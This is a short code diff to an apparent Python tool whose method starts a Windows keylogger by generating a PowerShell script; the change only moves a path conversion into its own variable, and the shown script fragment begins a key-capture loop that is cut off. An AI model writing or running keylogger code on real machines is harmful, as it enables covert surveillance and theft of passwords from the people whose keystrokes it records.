@@ -227,8 +227,9 @@ done
     async def _start_keylogger_windows(self) -> Dict:
         """Start keylogger on Windows using PowerShell"""
         
+        log_file_win = self.log_file.replace('/', '\\')
         ps_script = f'''
-$logFile = "{self.log_file.replace('/', '\\')}"
+$logFile = "{log_file_win}"
 Add-Type -AssemblyName System.Windows.Forms
 $lastKey = ""
 while ($true) {{
